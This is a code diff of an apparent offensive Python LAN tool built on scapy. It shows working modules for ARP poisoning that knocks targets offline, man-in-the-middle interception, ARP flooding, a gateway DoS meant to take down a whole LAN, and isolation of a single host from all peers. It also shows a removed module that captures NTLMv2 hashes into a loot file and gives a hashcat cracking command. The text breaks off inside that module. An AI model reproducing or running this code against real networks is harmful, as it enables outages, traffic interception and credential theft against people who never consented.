@@ -186,20 +186,6 @@ def ask_packets(default=6):
 
     return ppm, max_pkts
 
-def ask_pps(default=10):
-    """Ask for a packets-per-second rate. Used by kick/cage/flood modes."""
-    try:
-        val = int(Prompt.ask(
-            f"  [{C_STEEL}]Packets per second [{C_DIM}]default={default}[/{C_DIM}][/{C_STEEL}]",
-            default=str(default)
-        ))
-        return max(1, val)
-    except KeyboardInterrupt:
-        return default
-    except Exception:
-        warn(f"Invalid — using {default}")
-        return default
-
 # ── Network Helpers ────────────────────────────────────────────────────────────
 def long2net(arg):
     if arg <= 0 or arg >= 0xFFFFFFFF:
@@ -277,26 +263,11 @@ def get_gateway_ip():
         shutdown()
 
 def retrieve_mac(ip):
-    # Check the kernel ARP cache first (no packets needed)
     try:
-        import subprocess as _sp
-        out = _sp.check_output(["arp", "-n", ip], text=True, stderr=_sp.DEVNULL)
-        for line in out.splitlines():
-            if ip in line:
-                for tok in line.split():
-                    if len(tok) == 17 and tok.count(":") == 5:
-                        return tok.lower()
-    except Exception:
-        pass
-    # Fall back to sending an ARP request
-    try:
-        ans, _ = srp(
-            Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
-            iface=default_interface, timeout=2, verbose=0, retry=2
-        )
+        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=0)
         for _, rcv in ans:
             return rcv[Ether].src
-    except Exception:
+    except:
         pass
     return None
 
@@ -519,92 +490,56 @@ def resolve_targets(indices):
     return result
 
 # ── ARP Kick Engine ────────────────────────────────────────────────────────────
-def _spoof_loop(targets, pps, max_packets=0):
+def _spoof_loop(targets, ppm, max_packets=0):
     """
-    Bidirectional ARP poison loop.
-    pps         = packets per second (per direction per target)
-    max_packets = total packet cap across all sends (0 = unlimited)
+    ppm        = packets per minute PER TARGET
+    max_packets = total packet cap (0 = unlimited)
+    interval   = sleep between each individual sendPacket call
     """
-    interval = 1.0 / max(1, float(pps))
+    interval = (60.0 / float(ppm)) if ppm else 10.0
     sent = 0
-    gw_mac = default_gateway_mac
     while not stop_flag.is_set():
         for ip, mac in targets:
             if stop_flag.is_set():
                 break
-            if not mac:
-                continue
-            # Tell target: "gateway is at our MAC" (cuts target→internet)
-            sendp(
-                Ether(src=default_iface_mac, dst=mac) /
-                ARP(op=2, hwsrc=default_iface_mac, psrc=default_gateway_ip,
-                    hwdst=mac, pdst=ip),
-                verbose=False, iface=default_interface
-            )
-            sent += 1
-            # Tell gateway: "target is at our MAC" (cuts internet→target)
-            if gw_mac:
-                sendp(
-                    Ether(src=default_iface_mac, dst=gw_mac) /
-                    ARP(op=2, hwsrc=default_iface_mac, psrc=ip,
-                        hwdst=gw_mac, pdst=default_gateway_ip),
-                    verbose=False, iface=default_interface
-                )
+            if mac:
+                spoof.sendPacket(default_iface_mac, default_gateway_ip, ip, mac)
                 sent += 1
-            if max_packets > 0 and sent >= max_packets:
-                stop_flag.set()
-                log("SPOOF_LOOP_END", packets_sent=sent, reason="packet_cap_reached")
-                return
+                if max_packets > 0 and sent >= max_packets:
+                    stop_flag.set()
+                    log("SPOOF_LOOP_END", packets_sent=sent, reason="packet_cap_reached")
+                    return
             time.sleep(interval)
     log("SPOOF_LOOP_END", packets_sent=sent, reason="stopped")
 
 def re_arp(targets):
-    """Restore legitimate ARP mappings on both target and gateway."""
     console.print(f"\n  [{C_ORANGE}]Re-ARPing — restoring legitimate tables...[/{C_ORANGE}]")
-    gw_mac = default_gateway_mac
     for _ in range(10):
         for ip, mac in targets:
-            if not mac:
-                continue
-            try:
-                # Restore target's view: "gateway is at real gateway MAC"
-                if gw_mac:
-                    sendp(
-                        Ether(src=gw_mac, dst=mac) /
-                        ARP(op=2, hwsrc=gw_mac, psrc=default_gateway_ip,
-                            hwdst=mac, pdst=ip),
-                        verbose=False, iface=default_interface
-                    )
-                # Restore gateway's view: "target is at real target MAC"
-                if gw_mac:
-                    sendp(
-                        Ether(src=mac, dst=gw_mac) /
-                        ARP(op=2, hwsrc=mac, psrc=ip,
-                            hwdst=gw_mac, pdst=default_gateway_ip),
-                        verbose=False, iface=default_interface
-                    )
-            except Exception:
-                pass
+            if mac:
+                try:
+                    spoof.sendPacket(default_gateway_mac, default_gateway_ip, ip, mac)
+                except:
+                    pass
         time.sleep(0.2)
     ok("ARP tables restored.")
     log("REARP_COMPLETE", targets=[ip for ip, _ in targets])
 
-def run_attack(targets, label_str, pps=10, max_packets=0):
+def run_attack(targets, label_str, ppm=None, max_packets=0):
     stop_flag.clear()
-    t = threading.Thread(target=_spoof_loop, args=(targets, pps, max_packets), daemon=True)
+    t = threading.Thread(target=_spoof_loop, args=(targets, ppm, max_packets), daemon=True)
     t.start()
     ip_list = ", ".join(ip for ip, _ in targets)
-    dirs    = 2 if default_gateway_mac else 1
-    rate    = f"{pps} pkts/sec ({pps * dirs} total with bidirectional)"
-    cap_str = str(max_packets) if max_packets > 0 else "unlimited"
+    rate    = f"{ppm} pkts/min" if ppm else "6 pkts/min (default)"
+    cap_str = f"  cap={max_packets}" if max_packets > 0 else "  unlimited"
     log("ATTACK_START", mode=label_str, targets=ip_list, rate=rate, cap=max_packets)
 
     section(f"ATTACK ACTIVE — {label_str}")
     console.print(Panel(
         f"  {tag('Targets:', C_BLOOD)}  [{C_WHITE}]{ip_list}[/{C_WHITE}]\n"
         f"  {tag('Rate:',    C_STEEL)}    [{C_ASH}]{rate}[/{C_ASH}]\n"
-        f"  {tag('Cap:',     C_STEEL)}    [{C_ASH}]{cap_str}[/{C_ASH}]\n"
-        f"  {tag('Mode:',    C_STEEL)}    [{C_ASH}]ARP Poison bidirectional (target + gateway)[/{C_ASH}]\n\n"
+        f"  {tag('Cap:',     C_STEEL)}    [{C_ASH}]{max_packets if max_packets else 'unlimited'}[/{C_ASH}]\n"
+        f"  {tag('Mode:',    C_STEEL)}    [{C_ASH}]ARP Poison (gateway spoof)[/{C_ASH}]\n\n"
         f"  [{C_DIM}]Ctrl+C to stop and re-ARP targets[/{C_DIM}]",
         border_style=C_RUST,
         title=f"[bold {C_BLOOD}]◈ SPOOFING[/bold {C_BLOOD}]",
@@ -613,10 +548,9 @@ def run_attack(targets, label_str, pps=10, max_packets=0):
     try:
         elapsed = 0
         while t.is_alive():
-            est = elapsed * pps * dirs * len(targets)
             console.print(
                 f"  [{C_DIM}][{elapsed:>5}s][/{C_DIM}]  "
-                f"[{C_STEEL}]~{est} pkts sent[/{C_STEEL}]",
+                f"[{C_STEEL}]~{max(1, elapsed // max(1, int(60 / (ppm or 6))))} pkts sent[/{C_STEEL}]",
                 end="\r"
             )
             time.sleep(1)
@@ -631,30 +565,20 @@ def mode_kick_one():
     section("MODULE // KICK ONE")
     do_scan()
     print_host_table()
-    try:
-        idx = int(Prompt.ask(f"  [{C_BLOOD}]Select target index[/{C_BLOOD}]"))
-    except (ValueError, KeyboardInterrupt):
-        warn("Cancelled."); return
+    idx = int(Prompt.ask(f"  [{C_BLOOD}]Select target index[/{C_BLOOD}]"))
     targets = resolve_targets([idx])
-    if not targets or not targets[0][1]:
-        err("Cannot resolve target MAC — host may be offline."); return
-    pps = ask_pps()
-    run_attack(targets, "SINGLE TARGET", pps)
+    ppm, cap = ask_packets()
+    run_attack(targets, "SINGLE TARGET", ppm, cap)
 
 def mode_kick_some():
     section("MODULE // KICK SOME")
     do_scan()
     print_host_table()
-    try:
-        raw = Prompt.ask(f"  [{C_BLOOD}]Select targets (comma-separated indices)[/{C_BLOOD}]")
-    except KeyboardInterrupt:
-        warn("Cancelled."); return
+    raw = Prompt.ask(f"  [{C_BLOOD}]Select targets (comma-separated indices)[/{C_BLOOD}]")
     indices = [int(x.strip()) for x in raw.split(",") if x.strip().isdigit()]
-    targets = [(ip, mac) for ip, mac in resolve_targets(indices) if mac]
-    if not targets:
-        err("No valid targets — could not resolve any MACs."); return
-    pps = ask_pps()
-    run_attack(targets, f"{len(targets)} TARGETS", pps)
+    targets = resolve_targets(indices)
+    ppm, cap = ask_packets()
+    run_attack(targets, f"{len(targets)} TARGETS", ppm, cap)
 
 def mode_kick_all():
     section("MODULE // KICK ALL")
@@ -662,20 +586,18 @@ def mode_kick_all():
     print_host_table()
     if not Confirm.ask(f"  [{C_ORANGE}]Spoof ALL non-gateway hosts?[/{C_ORANGE}]"):
         return
-    targets = [(h[0], h[1]) for h in hosts_list
-               if h[0] != default_gateway_ip and h[1]]
-    if not targets:
-        err("No valid targets found (all missing MACs)."); return
-    pps = ask_pps()
-    run_attack(targets, "ALL HOSTS", pps)
+    targets = [(h[0], h[1]) for h in hosts_list if h[0] != default_gateway_ip]
+    ppm, cap = ask_packets()
+    run_attack(targets, "ALL HOSTS", ppm, cap)
 
 # ── MODULE: ARP Cache Poisoner (MITM) ─────────────────────────────────────────
 def mode_mitm():
     section("MODULE // ARP CACHE POISONER  [MITM]")
     console.print(Panel(
         f"  [{C_ASH}]Poisons BOTH the target and the gateway simultaneously.\n"
-        f"  All traffic is redirected through this machine.\n"
-        f"  IP forwarding is enabled automatically.[/{C_ASH}]",
+        f"  Traffic flows through this machine. Enable IP forwarding\n"
+        f"  to avoid dropping intercepted packets:\n\n"
+        f"  [{C_BLOOD}]echo 1 > /proc/sys/net/ipv4/ip_forward[/{C_BLOOD}][/{C_ASH}]",
         border_style=C_RUST,
         title=f"[bold {C_BLOOD}]◈ MITM MODE[/bold {C_BLOOD}]",
         padding=(1, 2),
@@ -684,55 +606,30 @@ def mode_mitm():
     do_scan()
     print_host_table()
 
-    try:
-        idx = int(Prompt.ask(f"  [{C_BLOOD}]Select target index[/{C_BLOOD}]"))
-    except (ValueError, KeyboardInterrupt):
-        warn("Cancelled."); return
-
+    idx        = int(Prompt.ask(f"  [{C_BLOOD}]Select target index[/{C_BLOOD}]"))
     target_ip  = hosts_list[idx][0]
     target_mac = hosts_list[idx][1] or retrieve_mac(target_ip)
     gw_mac     = default_gateway_mac or retrieve_mac(default_gateway_ip)
+    ppm, _     = ask_packets(default=20)
+    interval   = 60.0 / float(ppm)
 
-    if not target_mac:
-        err(f"Cannot resolve MAC for {target_ip}"); return
-    if not gw_mac:
-        err(f"Cannot resolve gateway MAC for {default_gateway_ip}"); return
-
-    # Enable IP forwarding so intercepted packets are relayed
-    try:
-        with open("/proc/sys/net/ipv4/ip_forward", "w") as _f:
-            _f.write("1")
-        console.print(f"  [{C_GOOD}]✔ IP forwarding enabled[/{C_GOOD}]")
-    except Exception as _e:
-        warn(f"Could not enable IP forwarding: {_e}")
-
-    pps      = ask_pps(default=5)
-    interval = 1.0 / float(pps)
-
-    log("MITM_START", target=target_ip, gateway=default_gateway_ip, pps=pps)
+    log("MITM_START", target=target_ip, gateway=default_gateway_ip, rate=ppm)
     stop_flag.clear()
     sent_count = [0]
 
     def _mitm_loop():
         while not stop_flag.is_set():
-            try:
-                # Tell target: "I am the gateway"
-                sendp(
-                    Ether(src=default_iface_mac, dst=target_mac) /
-                    ARP(op=2, hwsrc=default_iface_mac, psrc=default_gateway_ip,
-                        hwdst=target_mac, pdst=target_ip),
-                    verbose=False, iface=default_interface
-                )
-                # Tell gateway: "I am the target"
-                sendp(
-                    Ether(src=default_iface_mac, dst=gw_mac) /
-                    ARP(op=2, hwsrc=default_iface_mac, psrc=target_ip,
-                        hwdst=gw_mac, pdst=default_gateway_ip),
-                    verbose=False, iface=default_interface
-                )
-                sent_count[0] += 2
-            except Exception:
-                pass
+            # Tell target: "I am the gateway"
+            sendp(Ether(dst=target_mac) / ARP(
+                op=2, pdst=target_ip, hwdst=target_mac,
+                psrc=default_gateway_ip, hwsrc=default_iface_mac
+            ), verbose=False)
+            # Tell gateway: "I am the target"
+            sendp(Ether(dst=gw_mac) / ARP(
+                op=2, pdst=default_gateway_ip, hwdst=gw_mac,
+                psrc=target_ip, hwsrc=default_iface_mac
+            ), verbose=False)
+            sent_count[0] += 2
             time.sleep(interval)
         log("MITM_END", packets_sent=sent_count[0])
 
@@ -743,7 +640,7 @@ def mode_mitm():
     console.print(Panel(
         f"  {tag('Target:',  C_BLOOD)}   [{C_WHITE}]{target_ip}[/{C_WHITE}]  [{C_STEEL}]{target_mac}[/{C_STEEL}]\n"
         f"  {tag('Gateway:', C_STEEL)}   [{C_WHITE}]{default_gateway_ip}[/{C_WHITE}]  [{C_STEEL}]{gw_mac}[/{C_STEEL}]\n"
-        f"  {tag('Rate:',    C_STEEL)}   [{C_ASH}]{pps} pkts/sec (bidirectional)[/{C_ASH}]\n\n"
+        f"  {tag('Rate:',    C_STEEL)}   [{C_ASH}]{ppm} pkts/min (bidirectional)[/{C_ASH}]\n\n"
         f"  [{C_DIM}]Ctrl+C to stop and restore both ARP tables[/{C_DIM}]",
         border_style=C_RUST,
         title=f"[bold {C_BLOOD}]◈ INTERCEPTING[/bold {C_BLOOD}]",
@@ -766,27 +663,17 @@ def mode_mitm():
         console.print(f"\n  [{C_ORANGE}]Restoring both sides...[/{C_ORANGE}]")
         for _ in range(10):
             try:
-                sendp(
-                    Ether(src=gw_mac, dst=target_mac) /
-                    ARP(op=2, hwsrc=gw_mac, psrc=default_gateway_ip,
-                        hwdst=target_mac, pdst=target_ip),
-                    verbose=False, iface=default_interface
-                )
-                sendp(
-                    Ether(src=target_mac, dst=gw_mac) /
-                    ARP(op=2, hwsrc=target_mac, psrc=target_ip,
-                        hwdst=gw_mac, pdst=default_gateway_ip),
-                    verbose=False, iface=default_interface
-                )
-            except Exception:
+                sendp(Ether(dst=target_mac) / ARP(
+                    op=2, pdst=target_ip, hwdst=target_mac,
+                    psrc=default_gateway_ip, hwsrc=gw_mac
+                ), verbose=False)
+                sendp(Ether(dst=gw_mac) / ARP(
+                    op=2, pdst=default_gateway_ip, hwdst=gw_mac,
+                    psrc=target_ip, hwsrc=target_mac
+                ), verbose=False)
+            except:
                 pass
             time.sleep(0.2)
-        # Disable IP forwarding
-        try:
-            with open("/proc/sys/net/ipv4/ip_forward", "w") as _f:
-                _f.write("0")
-        except Exception:
-            pass
         ok("Both ARP tables restored.")
         log("MITM_REARP_COMPLETE")
 
@@ -802,37 +689,30 @@ def mode_arp_flood():
         padding=(1, 2),
     ))
 
-    try:
-        target_ip = Prompt.ask(f"  [{C_BLOOD}]Target IP[/{C_BLOOD}]")
-    except KeyboardInterrupt:
-        warn("Cancelled."); return
-
+    target_ip  = Prompt.ask(f"  [{C_BLOOD}]Target IP[/{C_BLOOD}]")
     target_mac = retrieve_mac(target_ip)
     if not target_mac:
-        err(f"Could not resolve MAC for {target_ip} — is the host online?")
+        err(f"Could not resolve MAC for {target_ip}")
         return
 
-    pps      = ask_pps(default=100)
-    interval = 1.0 / float(pps)
-    log("FLOOD_START", target=target_ip, target_mac=target_mac, pps=pps)
+    rate     = int(Prompt.ask(
+        f"  [{C_STEEL}]Packets per second [{C_DIM}]default=100[/{C_DIM}][/{C_STEEL}]",
+        default="100"
+    ))
+    interval = 1.0 / float(rate)
+    log("FLOOD_START", target=target_ip, rate_pps=rate)
     stop_flag.clear()
     sent_count = [0]
 
     def _flood_loop():
         import random
         while not stop_flag.is_set():
-            fake_ip  = f"{random.randint(1,254)}.{random.randint(0,254)}." \
-                       f"{random.randint(0,254)}.{random.randint(1,254)}"
+            fake_ip  = ".".join(str(random.randint(1, 254)) for _ in range(4))
             fake_mac = ":".join(f"{random.randint(0, 255):02x}" for _ in range(6))
-            try:
-                sendp(
-                    Ether(src=fake_mac, dst=target_mac) /
-                    ARP(op=2, hwsrc=fake_mac, psrc=fake_ip,
-                        hwdst=target_mac, pdst=target_ip),
-                    verbose=False, iface=default_interface
-                )
-            except Exception:
-                pass
+            sendp(Ether(dst=target_mac) / ARP(
+                op=2, pdst=target_ip, hwdst=target_mac,
+                psrc=fake_ip, hwsrc=fake_mac
+            ), verbose=False)
             sent_count[0] += 1
             time.sleep(interval)
         log("FLOOD_END", packets_sent=sent_count[0])
@@ -843,7 +723,7 @@ def mode_arp_flood():
     section("ARP FLOOD ACTIVE")
     console.print(Panel(
         f"  {tag('Target:',  C_BLOOD)}   [{C_WHITE}]{target_ip}[/{C_WHITE}]  [{C_STEEL}]{target_mac}[/{C_STEEL}]\n"
-        f"  {tag('Rate:',    C_STEEL)}   [{C_ASH}]{pps} pkts/sec[/{C_ASH}]\n"
+        f"  {tag('Rate:',    C_STEEL)}   [{C_ASH}]{rate} pkts/sec[/{C_ASH}]\n"
         f"  {tag('Payload:', C_STEEL)}   [{C_ASH}]randomised IP/MAC pairs[/{C_ASH}]\n\n"
         f"  [{C_DIM}]Ctrl+C to stop[/{C_DIM}]",
         border_style=C_RUST,
@@ -1241,7 +1121,8 @@ def mode_mac_spoof():
 # ── MODULE: Gateway DoS ───────────────────────────────────────────────────────
 def mode_gateway_dos():
     """
-    Floods the gateway's ARP table with fake client entries, causing it to
+    Poisons the gateway's ARP table specifically.
+    Floods the router with fake client entries, causing it to
     be unable to route traffic for the entire LAN.
     """
     section("MODULE // GATEWAY ARP DoS")
@@ -1261,42 +1142,40 @@ def mode_gateway_dos():
     if not gw_mac:
         err(f"Cannot resolve gateway MAC for {default_gateway_ip}"); return
 
-    pps = ask_pps(default=100)
+    pps = int(Prompt.ask(
+        f"  [{C_STEEL}]Packets per second [{C_DIM}]default=100[/{C_DIM}][/{C_STEEL}]",
+        default="100"
+    ))
     try:
         cap = int(Prompt.ask(
             f"  [{C_STEEL}]Packet cap [{C_DIM}]0=unlimited[/{C_DIM}][/{C_STEEL}]",
-            default="0"
+            default="500"
         ))
-    except (ValueError, KeyboardInterrupt):
-        cap = 0
+    except KeyboardInterrupt:
+        return
 
-    if not Confirm.ask(f"  [{C_ORANGE}]DoS gateway {default_gateway_ip}?[/{C_ORANGE}]"):
+    if not Confirm.ask(
+        f"  [{C_ORANGE}]DoS gateway {default_gateway_ip}?[/{C_ORANGE}]"
+    ):
         return
 
     interval   = 1.0 / float(pps)
     stop_flag.clear()
     sent_count = [0]
-    log("GW_DOS_START", gateway=default_gateway_ip, gw_mac=gw_mac, pps=pps, cap=cap)
+    log("GW_DOS_START", gateway=default_gateway_ip, pps=pps, cap=cap)
 
     def _flood():
         import random
         while not stop_flag.is_set():
-            fake_ip  = f"{random.randint(1,254)}.{random.randint(0,254)}." \
-                       f"{random.randint(0,254)}.{random.randint(1,254)}"
+            fake_ip  = ".".join(str(random.randint(1,254)) for _ in range(4))
             fake_mac = ":".join(f"{random.randint(0,255):02x}" for _ in range(6))
-            try:
-                sendp(
-                    Ether(src=fake_mac, dst=gw_mac) /
-                    ARP(op=2, hwsrc=fake_mac, psrc=fake_ip,
-                        hwdst=gw_mac, pdst=default_gateway_ip),
-                    verbose=False, iface=default_interface
-                )
-            except Exception:
-                pass
+            sendp(Ether(dst=gw_mac)/ARP(
+                op=2, pdst=default_gateway_ip, hwdst=gw_mac,
+                psrc=fake_ip, hwsrc=fake_mac
+            ), verbose=False)
             sent_count[0] += 1
             if cap > 0 and sent_count[0] >= cap:
-                stop_flag.set()
-                break
+                stop_flag.set(); break
             time.sleep(interval)
         log("GW_DOS_END", sent=sent_count[0])
 
@@ -1309,19 +1188,14 @@ def mode_gateway_dos():
         f"  {tag('Rate:',    C_STEEL)}   [{C_ASH}]{pps} pkts/sec[/{C_ASH}]\n"
         f"  {tag('Cap:',     C_STEEL)}   [{C_ASH}]{cap if cap else 'unlimited'}[/{C_ASH}]\n\n"
         f"  [{C_DIM}]Ctrl+C to stop[/{C_DIM}]",
-        border_style=C_RUST, padding=(1, 2),
+        border_style=C_RUST, padding=(1,2),
         title=f"[bold {C_BLOOD}]◈ FLOODING GATEWAY[/bold {C_BLOOD}]"
     ))
     try:
-        elapsed = 0
         while t.is_alive():
             console.print(
-                f"  [{C_DIM}][{elapsed:>5}s][/{C_DIM}]  "
-                f"[{C_STEEL}]{sent_count[0]} pkts sent[/{C_STEEL}]",
-                end="\r"
-            )
+                f"  [{C_DIM}]{sent_count[0]} pkts sent[/{C_DIM}]", end="\r")
             time.sleep(1)
-            elapsed += 1
     except KeyboardInterrupt:
         stop_flag.set()
         t.join(timeout=2)
@@ -1334,6 +1208,7 @@ def mode_arp_cage():
     """
     Isolates a target from the ENTIRE subnet by poisoning it away
     from every other host simultaneously — not just the gateway.
+    Complete LAN isolation.
     """
     section("MODULE // ARP CAGE  [FULL ISOLATION]")
     console.print(Panel(
@@ -1348,52 +1223,41 @@ def mode_arp_cage():
     do_scan()
     print_host_table()
 
-    try:
-        idx = int(Prompt.ask(f"  [{C_BLOOD}]Select target index[/{C_BLOOD}]"))
-    except (ValueError, KeyboardInterrupt):
-        warn("Cancelled."); return
-
+    idx = int(Prompt.ask(f"  [{C_BLOOD}]Select target index[/{C_BLOOD}]"))
     target_ip  = hosts_list[idx][0]
     target_mac = hosts_list[idx][1] or retrieve_mac(target_ip)
 
     if not target_mac:
-        err("Cannot resolve target MAC — host may be offline."); return
+        err("Cannot resolve target MAC."); return
 
-    peers = [h for h in hosts_list if h[0] != target_ip and h[1]]
-    if not peers:
-        err("No other hosts with known MACs found on subnet."); return
-
-    pps = ask_pps(default=20)
-    # Distribute the total PPS budget across all peers
-    per_peer_interval = float(len(peers)) / float(pps)
+    ppm, cap = ask_packets(default=30)
+    interval  = 60.0 / float(ppm)
 
     if not Confirm.ask(
-        f"  [{C_ORANGE}]Cage {target_ip} away from {len(peers)} peers?[/{C_ORANGE}]"
+        f"  [{C_ORANGE}]Cage {target_ip} away from all {len(hosts_list)-1} peers?[/{C_ORANGE}]"
     ):
         return
 
     stop_flag.clear()
     sent_count = [0]
-    log("CAGE_START", target=target_ip, peers=len(peers), pps=pps)
+    log("CAGE_START", target=target_ip, peers=len(hosts_list)-1)
 
     def _cage():
+        import random
         while not stop_flag.is_set():
-            for host in peers:
-                if stop_flag.is_set():
-                    break
-                peer_ip, peer_mac = host[0], host[1]
-                try:
-                    # Tell target: "peer_ip is at our MAC" (lie — isolates target)
-                    sendp(
-                        Ether(src=default_iface_mac, dst=target_mac) /
-                        ARP(op=2, hwsrc=default_iface_mac, psrc=peer_ip,
-                            hwdst=target_mac, pdst=target_ip),
-                        verbose=False, iface=default_interface
-                    )
-                    sent_count[0] += 1
-                except Exception:
-                    pass
-                time.sleep(per_peer_interval)
+            for host in hosts_list:
+                if stop_flag.is_set(): break
+                peer_ip = host[0]
+                if peer_ip == target_ip: continue
+                # Tell target: "peer is at my MAC" (lie)
+                sendp(Ether(dst=target_mac)/ARP(
+                    op=2, pdst=target_ip, hwdst=target_mac,
+                    psrc=peer_ip, hwsrc=default_iface_mac
+                ), verbose=False)
+                sent_count[0] += 1
+                if cap > 0 and sent_count[0] >= cap:
+                    stop_flag.set(); break
+                time.sleep(interval / max(1, len(hosts_list)))
         log("CAGE_END", sent=sent_count[0])
 
     t = threading.Thread(target=_cage, daemon=True)
@@ -1402,40 +1266,31 @@ def mode_arp_cage():
     section("ARP CAGE ACTIVE")
     console.print(Panel(
         f"  {tag('Target:',  C_BLOOD)}   [{C_WHITE}]{target_ip}[/{C_WHITE}]  [{C_STEEL}]{target_mac}[/{C_STEEL}]\n"
-        f"  {tag('Peers:',   C_STEEL)}   [{C_ASH}]{len(peers)} hosts being faked[/{C_ASH}]\n"
-        f"  {tag('Rate:',    C_STEEL)}   [{C_ASH}]{pps} pkts/sec total[/{C_ASH}]\n\n"
-        f"  [{C_DIM}]Ctrl+C to stop and restore target ARP cache[/{C_DIM}]",
-        border_style=C_RUST, padding=(1, 2),
+        f"  {tag('Peers:',   C_STEEL)}   [{C_ASH}]{len(hosts_list)-1} hosts being faked[/{C_ASH}]\n"
+        f"  {tag('Rate:',    C_STEEL)}   [{C_ASH}]{ppm} pkts/min[/{C_ASH}]\n\n"
+        f"  [{C_DIM}]Ctrl+C to stop and re-ARP[/{C_DIM}]",
+        border_style=C_RUST, padding=(1,2),
         title=f"[bold {C_BLOOD}]◈ CAGED[/bold {C_BLOOD}]"
     ))
     try:
-        elapsed = 0
         while t.is_alive():
             console.print(
-                f"  [{C_DIM}][{elapsed:>5}s][/{C_DIM}]  "
-                f"[{C_STEEL}]{sent_count[0]} pkts sent[/{C_STEEL}]",
-                end="\r"
-            )
+                f"  [{C_DIM}]{sent_count[0]} pkts sent[/{C_DIM}]", end="\r")
             time.sleep(1)
-            elapsed += 1
     except KeyboardInterrupt:
         stop_flag.set()
         t.join(timeout=3)
+        # Restore target's view of all peers
         console.print(f"\n  [{C_ORANGE}]Restoring target ARP cache...[/{C_ORANGE}]")
         for _ in range(8):
-            for host in peers:
-                peer_ip, peer_mac = host[0], host[1]
-                if not peer_mac:
-                    continue
+            for host in hosts_list:
+                if host[0] == target_ip: continue
                 try:
-                    sendp(
-                        Ether(src=peer_mac, dst=target_mac) /
-                        ARP(op=2, hwsrc=peer_mac, psrc=peer_ip,
-                            hwdst=target_mac, pdst=target_ip),
-                        verbose=False, iface=default_interface
-                    )
-                except Exception:
-                    pass
+                    sendp(Ether(dst=target_mac)/ARP(
+                        op=2, pdst=target_ip, hwdst=target_mac,
+                        psrc=host[0], hwsrc=host[1]
+                    ), verbose=False)
+                except: pass
             time.sleep(0.2)
         ok("ARP cage released — target restored.")
         log("CAGE_RELEASED")
@@ -2221,146 +2076,6 @@ def mode_mitm_engine():
         err(f"MITM Engine error: {ex}")
         import traceback; traceback.print_exc()
 
-# ── MODULE: NTLMv2 Hash Capture ───────────────────────────────────────────────
-def mode_ntlm_capture():
-    """
-    Positions attacker as MITM via bidirectional ARP poison, then sniffs
-    SMB/445 and HTTP/80,8080 traffic for NTLMSSP authentication blobs.
-    Captured hashes are written to ktox_loot/ntlm_hashes.txt for
-    offline cracking: hashcat -m 5600 ntlm_hashes.txt wordlist.txt
-    """
-    section("MODULE // NTLMv2 HASH CAPTURE")
-    console.print(Panel(
-        f"  [{C_ASH}]ARP-poisons the target into MITM position, then sniffs\n"
-        f"  SMB (445) and HTTP (80/8080) for NTLM authentication.\n"
-        f"  Captured hashes → [bold]ktox_loot/ntlm_hashes.txt[/bold]\n"
-        f"  Crack offline:  hashcat -m 5600 ntlm_hashes.txt wordlist.txt[/{C_ASH}]",
-        border_style=C_RUST,
-        title=f"[bold {C_BLOOD}]◈ NTLMv2 CAPTURE[/bold {C_BLOOD}]",
-        padding=(1, 2),
-    ))
-
-    do_scan()
-    print_host_table()
-
-    try:
-        idx = int(Prompt.ask(f"  [{C_BLOOD}]Select target index[/{C_BLOOD}]"))
-    except (ValueError, KeyboardInterrupt):
-        warn("Cancelled."); return
-
-    target_ip  = hosts_list[idx][0]
-    target_mac = hosts_list[idx][1] or retrieve_mac(target_ip)
-    gw_mac     = default_gateway_mac or retrieve_mac(default_gateway_ip)
-
-    if not target_mac:
-        err(f"Cannot resolve MAC for {target_ip}"); return
-    if not gw_mac:
-        err(f"Cannot resolve gateway MAC for {default_gateway_ip}"); return
-
-    # Enable IP forwarding so the target's traffic still flows
-    try:
-        with open("/proc/sys/net/ipv4/ip_forward", "w") as _f:
-            _f.write("1")
-        console.print(f"  [{C_GOOD}]✔ IP forwarding enabled[/{C_GOOD}]")
-    except Exception as _e:
-        warn(f"Could not enable IP forwarding: {_e}")
-
-    pps      = ask_pps(default=5)
-    interval = 1.0 / float(pps)
-
-    # Load NTLMCapture from ktox_advanced
-    ntlm_cap = None
-    try:
-        import ktox_advanced
-        attacker_ip = get_if_addr(default_interface) if default_interface else "0.0.0.0"
-        ntlm_cap = ktox_advanced.NTLMCapture(default_interface, attacker_ip)
-        ntlm_cap.start()
-        console.print(f"  [{C_GOOD}]✔ NTLM sniffer active on {default_interface}[/{C_GOOD}]")
-    except Exception as _e:
-        warn(f"NTLMCapture sniffer failed to start: {_e}")
-
-    log("NTLM_CAPTURE_START", target=target_ip, gateway=default_gateway_ip, pps=pps)
-    stop_flag.clear()
-    sent_count = [0]
-
-    def _mitm_loop():
-        while not stop_flag.is_set():
-            try:
-                sendp(
-                    Ether(src=default_iface_mac, dst=target_mac) /
-                    ARP(op=2, hwsrc=default_iface_mac, psrc=default_gateway_ip,
-                        hwdst=target_mac, pdst=target_ip),
-                    verbose=False, iface=default_interface
-                )
-                sendp(
-                    Ether(src=default_iface_mac, dst=gw_mac) /
-                    ARP(op=2, hwsrc=default_iface_mac, psrc=target_ip,
-                        hwdst=gw_mac, pdst=default_gateway_ip),
-                    verbose=False, iface=default_interface
-                )
-                sent_count[0] += 2
-            except Exception:
-                pass
-            time.sleep(interval)
-
-    t = threading.Thread(target=_mitm_loop, daemon=True)
-    t.start()
-
-    section("NTLMv2 CAPTURE ACTIVE")
-    console.print(Panel(
-        f"  {tag('Target:',  C_BLOOD)}   [{C_WHITE}]{target_ip}[/{C_WHITE}]  [{C_STEEL}]{target_mac}[/{C_STEEL}]\n"
-        f"  {tag('Gateway:', C_STEEL)}   [{C_WHITE}]{default_gateway_ip}[/{C_WHITE}]  [{C_STEEL}]{gw_mac}[/{C_STEEL}]\n"
-        f"  {tag('Sniff:',   C_STEEL)}   [{C_ASH}]SMB/445  HTTP/80  HTTP/8080[/{C_ASH}]\n"
-        f"  {tag('Loot:',    C_STEEL)}   [{C_ASH}]ktox_loot/ntlm_hashes.txt[/{C_ASH}]\n\n"
-        f"  [{C_DIM}]Ctrl+C to stop and restore ARP tables[/{C_DIM}]",
-        border_style=C_RUST,
-        title=f"[bold {C_BLOOD}]◈ CAPTURING[/bold {C_BLOOD}]",
-        padding=(1, 2),
-    ))
-
-    try:
-        elapsed = 0
-        while t.is_alive():
-            hashes = len(ntlm_cap._hashes) if ntlm_cap else 0
-            console.print(
-                f"  [{C_DIM}][{elapsed:>5}s][/{C_DIM}]  "
-                f"[{C_STEEL}]{sent_count[0]} MITM pkts  "
-                f"[{C_GOOD}]{hashes} hash(es) captured[/{C_GOOD}][/{C_STEEL}]",
